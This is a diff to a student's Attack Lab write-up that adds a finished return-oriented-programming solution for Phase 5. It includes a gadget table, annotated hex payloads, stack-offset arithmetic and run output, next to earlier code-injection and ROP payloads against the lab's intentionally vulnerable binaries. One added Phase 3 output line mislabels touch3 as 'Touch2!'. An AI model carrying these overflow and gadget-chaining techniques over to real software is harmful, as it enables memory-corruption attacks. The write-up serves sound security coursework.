@@ -40,6 +40,7 @@ stack gets boring, by stitching together existing code with ROP. ✨
 | `ctarget02.txt` | 💉 My Phase 2 payload |
 | `ctarget03.txt` | 💉 My Phase 3 payload |
 | `rtarget02.txt` | 💉 My Phase 4 (ROP) payload |
+| `rtarget03.txt` | 💉 My Phase 5 (ROP) payload |
 | `ctarget.d` / `rtarget.d` | 🔍 Full `objdump -d` disassemblies |
 | `ctarget02.s` / `ctarget03.s` | 📝 Assembler source of my injected code |
 | `cookie.txt` | ❌ **Not included** — personal per-instance value |
@@ -74,7 +75,7 @@ cat ctarget03.txt | ./hex2raw | ./ctarget
 
 Every payload below is a hex-byte file piped through `./hex2raw`, which strips
 comments (`/* */`) and whitespace — so the annotated payloads
-(`ctarget01.txt` … `rtarget02.txt`) are directly runnable.
+(`ctarget01.txt` … `rtarget03.txt`) are directly runnable.
 
 > ⚠️ `cookie.txt` is not in this repo, so a fresh run gets a *different* cookie
 > than `0x4df13892` used below.
@@ -100,7 +101,7 @@ the attack is entirely about what the *stack* looks like at that moment:
 | 2 | `touch2` | pass the cookie in `%rdi` | inject code |
 | 3 | `touch3` | pass the cookie *string* in `%rdi` | inject code + stash a string |
 | 4 | `touch2` | pass the cookie in `%rdi` | ROP gadget chain |
-| 5 | `touch3` | pass the cookie *string* in `%rdi` | ROP *(not required — TBD)* |
+| 5 | `touch3` | pass the cookie *string* in `%rdi` | ROP gadget chain + stash a string |
 
 ---
 
@@ -178,7 +179,7 @@ zeros, then write `touch1`'s address in **little-endian** byte order:
 ```
 
 ```bash
-$ cat ctarget01.txt | ./hex2raw | ./ctarget
+$ cat ctarget01.txt | ./hex2raw | ./ctarget -q
 Touch1!: You called touch1()
 Valid solution for level 1 with target ctarget
 ```
@@ -191,9 +192,6 @@ Simple. 😌
 then jumps to `touch2` (`0x808960`). `touch2` prints the cookie and compares it to the
 global `cookie`:
 
-```
-Touch2!: You called touch2(0x4df13892)
-```
 
 `ctarget`'s stack is **fixed and executable**, so we can place real machine code in
 the buffer. My payload is 13 bytes:
@@ -218,6 +216,12 @@ e0 90 64 55 00 00 00 00                 ← return address → 0x556490e0
 `mov` sets `%rdi = 0x4df13892`, `push` drops `touch2`'s address onto the stack, and
 `ret` jumps straight into it. 🎉
 
+```bash
+$ cat ctarget02.txt | ./hex2raw | ./ctarget -q
+Touch2!: You called touch2(0x4df13892)
+Valid solution for level 2 with target ctarget
+```
+
 > 🪤 **Gotcha: the injected code must start at offset 40 (`0x556490e0`) — don't shift it!**
 > The 13-byte payload must start at byte offset 40 of the 56-byte buffer. If it
 > starts later, it
@@ -228,11 +232,7 @@ e0 90 64 55 00 00 00 00                 ← return address → 0x556490e0
 ### 🥊 Phase 3 — `touch3` (inject code that passes the cookie *string*)
 
 **Goal:** pass the cookie to `touch3` (`0x808a77`) as a **string** — `"4df13892"`
-(null-terminated) — because `touch3` compares it with `hexmatch()`:
-
-```
-Touch3!: You called touch3("4df13892")
-```
+(null-terminated) — because `touch3` compares it with `hexmatch()`.
 
 Two things to handle:
 
@@ -259,6 +259,12 @@ The `0x34` is ASCII `'4'`, and `64 66 31 33 38 39 32 00` is `"df13892\0"` — to
 `"4df13892"`. `%rdi` points there, so `hexmatch` finds the string regardless of where
 its own stack frame lands. 🧠
 
+```bash
+$ cat ctarget03.txt | ./hex2raw | ./ctarget -q
+Touch2!: You called touch3("4df13892")
+Valid solution for level 3 with target ctarget
+```
+
 ---
 
 ## 🧱 Part II: Return-Oriented Programming (`rtarget`)
@@ -279,23 +285,37 @@ each gadget ends in `ret`, it pops the *next* address off the stack, so the whol
 attack becomes nothing more than a stack full of addresses:
 
 ```
-buffer padding → gadget1 → cookie → gadget2 → touch2 → ...
+buffer padding → gadget₁ → operand₁ → gadget₂ → operand₂ → touchX → ...
 ```
 
 The code addresses are all fixed (non-PIE), so we still know exactly where every
-gadget lives — only the *data* (our buffer) is at an unknown address, and ROP never
-needs to reference the stack by address for Phase 4. 
+gadget lives — only the *data* (our buffer) is at an unknown address. That unknown
+address is exactly what separates the two phases:
 
-### 🔎 Gadget hunting: the farm
+- **Phase 4** only needs to load a *constant* (the cookie) into `%rdi`. The value
+  rides on the ROP stack as a literal operand, so the chain never has to reference
+  a stack address at all.
+- **Phase 5** must point `%rdi` at the cookie *string*, which lives on the stack at
+  a randomized address. The chain therefore *computes* the address at run time: it
+  captures `%rsp`, adds a fixed offset, and lands on the string.
 
-`rtarget` ships with a "gadget farm" — a heap of innocuous-looking functions
-(`getval_352`, `setval_366`, `add_xy`, …) whose machine-code bytes accidentally
-contain useful instruction sequences if you jump in at the *right offset* (see
-`farm.c`). The rule: gadgets may only use `movq`, `popq`, `nop`, and `ret`.
+To build either chain we need the right building blocks — and `rtarget` gives them
+to us as a **gadget farm**.
+
+### 🔎 The gadget farm
+
+The farm is a heap of innocuous-looking functions (`getval_352`, `setval_366`,
+`add_xy`, …) in the target's own code (see `farm.c`). Their machine-code bytes
+accidentally contain useful instruction sequences if you jump in at the *right
+offset*. Phase 4 officially restricts gadgets to `movq`, `popq`, `nop`, and
+`ret`; for Phase 5 that is relaxed — the farm even ships a whole `add_xy`
+function, plus the 32-bit `movl` moves needed to ferry a constant into `%rsi`.
 `farm.c` compiles cleanly (`gcc -Og -o farm farm.c`), so you can `objdump -d` your
 own copy and hunt for gadgets the same way I did.
 
-#### Gadget 1: `popq %rax; retq` — at `0x808b47`
+**Hunting technique.** A gadget can hide *inside* another instruction — the bytes
+are fixed, but the CPU happily starts decoding at whatever offset you jump to.
+Two worked examples:
 
 ```
 0000000000808b43 <getval_352>:
@@ -308,8 +328,6 @@ own copy and hunt for gadgets the same way I did.
 `58 c3` — which is `popq %rax; retq`. The `mov` immediate conveniently contains
 the `pop` opcode. 🎣
 
-#### Gadget 2: `movq %rax, %rdi; retq` — at `0x808b23`
-
 ```
 0000000000808b21 <setval_366>:
   808b21:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
@@ -320,16 +338,37 @@ Same trick. Jumping to offset **+2** (`0x808b23`) hits `48 89 c7 c3` —
 `movq %rax, %rdi; retq`. The immediate `0xc3c78948` is literally the little-endian
 bytes of our two instructions. 😄
 
+**The arsenal.** Both phases draw from the same pool. Seven gadgets in total,
+numbered below in the order the Phase-5 chain uses them:
+
+| # | Instructions | Address | Bytes (from that address) | Where |
+| --- | --- | --- | --- | --- |
+| 1 | `popq %rax` | `0x808b47` | `58 c3` | inside `getval_352` — hunt #1 above |
+| 2 | `movq %rax, %rdi` | `0x808b23` | `48 89 c7 c3` | inside `setval_366` — hunt #2 above |
+| 3 | `movq %rsp, %rax` | `0x808bec` | `48 89 e0 c3` | inside `setval_109`'s immediate |
+| 4 | `movl %eax, %edx; cmp %dl,%dl` | `0x808c1a` | `89 c2 38 d2 c3` | inside `getval_128` |
+| 5 | `movl %edx, %ecx; cmp %cl,%cl` | `0x808b5c` | `89 d1 38 c9 c3` | inside `getval_213` |
+| 6 | `movl %ecx, %esi; cmp %bl,%bl` | `0x808bcf` | `89 ce 38 db c3` | inside `addval_150` |
+| 7 | `lea (%rdi,%rsi,1), %rax` | `0x808b56` | `48 8d 04 37 c3` | the whole `add_xy` function |
+
+The `cmp %dl,%dl` / `%cl,%cl` / `%bl,%bl` in gadgets 4–6 only touch the flags, so
+they behave like `nop`s. The moves are `movl` (32-bit), which zero the upper half
+of their destination register — harmless with such a small offset. 🧘
+
 ### 🥊 Phase 4 — `touch2` via ROP (pass the cookie with gadgets)
 
 **Goal:** same as Phase 2 — cookie in `%rdi`, then call `touch2` (`0x808960`) — but
 with zero lines of injected code.
 
-The two gadgets above are exactly what we need. The chain:
+Phase 4 only needs a *data value*, and that value rides on the ROP stack as a
+literal operand — no stack address has to be computed. Gadgets 1 and 2 are all
+it takes:
 
-1. `popq %rax` — pops the **cookie value** off our stack into `%rax`
-2. `movq %rax, %rdi` — moves it into the first argument register
-3. `touch2` — clean return into `touch2`, which prints `Touch2!: You called touch2(0x4df13892)`
+```
+popq  %rax             %rax = 0x4df13892   (popped straight off the ROP stack)
+movq  %rax,%rdi        %rdi = cookie → first argument
+touch2
+```
 
 ```
 00 × 56                                     ← fill getbuf()'s 56-byte buffer
@@ -346,38 +385,69 @@ Read it like a program: `getbuf` returns → `ret` sends us to `0x808b47`
 `ret` consuming one address — no stack-address knowledge required. 🧩
 
 ```bash
-$ cat rtarget02.txt | ./hex2raw | ./rtarget
+$ cat rtarget02.txt | ./hex2raw | ./rtarget -q
 Touch2!: You called touch2(0x4df13892)
 Valid solution for level 2 with target rtarget
 ```
 
-### 🥊 Phase 5 — `touch3` via ROP *(not required — will add later)*
+### 🥊 Phase 5 — `touch3` via ROP (compute the *string* pointer with gadgets)
 
-Phase 5 asks for the same thing as Phase 3: point `%rdi` at the *string*
-`"4df13892"` so `touch3` (`0x808a77`) can compare it with `hexmatch`. This phase
-was **not required by my course**, so I haven't done it yet — the notes below are
-the approach I'll follow when I come back to fill it in. 🏳️
+**Goal:** same as Phase 3 — point `%rdi` at the string `"4df13892"` so `touch3`
+(`0x808a77`) can compare it with `hexmatch` — but now the stack address is
+**randomized**, so the string's address can never be hardcoded. 🔮
 
-The idea is elegant. We can't know the stack address ahead of time… but `%rsp` *is*
-the stack pointer, and the farm has gadgets that shift it:
+The only fact we can rely on is the payload's **relative layout** — so instead of
+loading a hardcoded address, the chain *computes* one: capture `%rsp` while it is
+running, add a fixed offset that lands exactly on the string, and hand the result
+to `touch3`. That's what gadget 7 (`add_xy`) is for — the farm's gift. 🎁
 
-- `movq %rsp, %rax` — capture the current stack position
-- `addq $imm, %rax` / `leaq disp(%rax), %rdi` — walk forward to a known offset
-  where we stashed the cookie string (via the `add_xy` function's
-  `48 89 e0` / `48 01 d0` byte sequences: `movq %rsp, %rax; addq %rax, %rdi` etc.)
+**Offset math.** When `getbuf` returns, `%rsp` points at `base + 64` (`base` =
+buffer start). Gadget 3 captures exactly that value, so `%rdi = base + 64`. The
+cookie string lives at `base + 200`, so the offset to add is `200 - 64 = 136 =
+0x88`. That keeps the string 80 bytes clear of `hexmatch`'s ~128-byte stack
+frame — far enough that it can never be overwritten. 🧠
 
-Chaining those lets us compute the string's address **at runtime** from `%rsp`,
-keeping the string inside our own payload:
+**The chain** — gadget 3 grabs `%rsp` into `%rdi`, gadget 1 pops the constant
+offset, gadgets 4–6 ferry it into `%rsi`, gadget 7 adds the two, and gadget 2
+lands the result in `%rdi`:
 
 ```
-padding → mov %rsp,%rax → addq $imm,%rax → mov %rax,%rdi → touch3 → "4df13892\0"
+movq  %rsp,%rax         %rax = base + 64
+movq  %rax,%rdi         %rdi = base + 64
+popq  %rax              %rax = 0x88               (the offset)
+movl  %eax,%edx
+movl  %edx,%ecx
+movl  %ecx,%esi         %rsi = 0x88
+lea   (%rdi,%rsi),%rax  %rax = base + 64 + 136 = base + 200
+movq  %rax,%rdi         %rdi → "4df13892" @ base + 200
+touch3
 ```
 
-> The official CS:APP write-ups solve it with the `add_xy` farm
-> (`48 89 e0` = `movq %rsp, %rax` at `0x808d03`, `48 01 d0` = `addq %rax, %rdi` at
-> `0x808d08` *et al.*), but those sequences may differ in this course instance, so
-> the exact gadget addresses need re-verifying against `rtarget.d` when I pick
-> this up again. TODO: solve & document 📌
+```
+00 × 56                                     ← fill getbuf()'s 56-byte buffer
+ec 8b 80 00 00 00 00 00                     ← gadget 3: movq %rsp,%rax       @ 0x808bec
+23 8b 80 00 00 00 00 00                     ← gadget 2: movq %rax,%rdi       @ 0x808b23
+47 8b 80 00 00 00 00 00                     ← gadget 1: popq %rax            @ 0x808b47
+88 00 00 00 00 00 00 00                     ← offset 0x88 → %rax
+1a 8c 80 00 00 00 00 00                     ← gadget 4: movl %eax,%edx       @ 0x808c1a
+5c 8b 80 00 00 00 00 00                     ← gadget 5: movl %edx,%ecx       @ 0x808b5c
+cf 8b 80 00 00 00 00 00                     ← gadget 6: movl %ecx,%esi       @ 0x808bcf
+56 8b 80 00 00 00 00 00                     ← gadget 7: lea (%rdi,%rsi),%rax @ 0x808b56
+23 8b 80 00 00 00 00 00                     ← gadget 2: movq %rax,%rdi       @ 0x808b23
+77 8a 80 00 00 00 00 00                     ← touch3                         @ 0x808a77
+00 × 64                                     ← padding to offset 200
+34 64 66 31 33 38 39 32 00                  ← "4df13892\0" @ offset 200
+```
+
+```bash
+$ cat rtarget03.txt | ./hex2raw | ./rtarget -q
+Touch3!: You called touch3("4df13892")
+Valid solution for level 3 with target rtarget
+```
+
+That completes the whole lab: five phases, two targets, one overflowing
+`getbuf()`. 🏁
+
 
 ---
 
@@ -397,7 +467,7 @@ padding → mov %rsp,%rax → addq $imm,%rax → mov %rax,%rdi → touch3 → "4
   disassemble from every offset.
 - **`hex2raw` is your friend.** Every payload above is a hex-byte file piped
   through `./hex2raw`; the converter strips comments (`/* */`) and whitespace, so
-  annotated payloads like `ctarget01.txt`–`rtarget02.txt` are directly runnable.
+  annotated payloads like `ctarget01.txt`–`rtarget03.txt` are directly runnable.
 
 All code addresses in this write-up come from `ctarget.d` / `rtarget.d`
 (`objdump -d`), and every stack address in Part I was pinned down with GDB — the
@@ -413,7 +483,7 @@ two tools do 95% of the work. 🔧
 | 2 | `ctarget02.txt` | ✅ `Valid solution for level 2 with target ctarget` |
 | 3 | `ctarget03.txt` | ✅ `Valid solution for level 3 with target ctarget` |
 | 4 | `rtarget02.txt` | ✅ `Valid solution for level 2 with target rtarget` |
-| 5 | — | ⏳ not required by course — will add later |
+| 5 | `rtarget03.txt` | ✅ `Valid solution for level 3 with target rtarget` |
 
 ---
 
